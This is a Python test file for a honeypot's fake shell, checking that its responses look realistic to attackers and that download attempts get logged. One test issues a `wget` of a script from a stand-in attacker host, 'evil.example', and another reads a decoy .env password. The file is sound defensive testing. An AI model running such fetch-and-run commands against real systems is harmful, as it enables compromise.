"""Tests for the stateful fake shell — the part that most affects whether an
attacker can fingerprint the honeypot on their first few commands."""


def test_pwd_and_whoami(shell):
    assert shell.run("pwd").strip() == "/root"
    assert shell.run("whoami").strip() == "root"


def test_cd_changes_directory(shell):
    shell.run("cd /var/www/html")
    assert shell.run("pwd").strip() == "/var/www/html"


def test_cd_relative_and_dotdot(shell):
    shell.run("cd /var/www/html")
    shell.run("cd ..")
    assert shell.run("pwd").strip() == "/var/www"


def test_cd_home_shortcuts(shell):
    shell.run("cd /etc")
    shell.run("cd")            # bare cd → home
    assert shell.run("pwd").strip() == "/root"
    shell.run("cd ~")
    assert shell.run("pwd").strip() == "/root"


def test_cd_nonexistent_errors(shell):
    out = shell.run("cd /does/not/exist")
    assert "No such file or directory" in out
    assert shell.run("pwd").strip() == "/root"   # cwd unchanged


def test_ls_reflects_directory(shell):
    shell.run("cd /var/www/html")
    out = shell.run("ls")
    # Plain ls lists non-hidden files; dotfiles only show with -a.
    assert "config.php" in out and "wp-config.php" in out
    assert ".env" not in out
    assert ".env" in shell.run("ls -a")


def test_ls_la_hidden_files(shell):
    out = shell.run("ls -la")          # in /root
    assert ".bash_history" in out
    assert "total" in out


def test_cat_reads_decoy_file(shell):
    out = shell.run("cat /var/www/html/.env")
    assert "DB_PASS=Sup3rS3cr3t!" in out


def test_cat_missing_file(shell):
    out = shell.run("cat /etc/nope.conf")
    assert "No such file or directory" in out


def test_unknown_command(shell):
    assert "command not found" in shell.run("definitely_not_a_real_binary")


def test_echo_expands_basic_vars(shell):
    assert shell.run("echo $USER").strip() == "root"
    assert shell.run("echo hello world").strip() == "hello world"


def test_static_command_uname(shell):
    assert "Linux" in shell.run("uname -a")


def test_wget_logs_download_attempt(hp, shell):
    # The wget handler must emit a MALWARE_DOWNLOAD_ATTEMPT event.
    events = []
    orig = hp.log_event
    hp.log_event = lambda *a, **k: events.append((a, k))
    try:
        shell.run("wget http://evil.example/x.sh")
    finally:
        hp.log_event = orig
    assert any(a and a[0] == "MALWARE_DOWNLOAD_ATTEMPT" for a, _ in events)


def test_command_chain(shell):
    out = shell.run("cd /etc && pwd")
    assert "/etc" in out


def test_mkdir_then_visible(shell):
    shell.run("cd /tmp")
    shell.run("mkdir loot")
    assert "loot" in shell.run("ls")
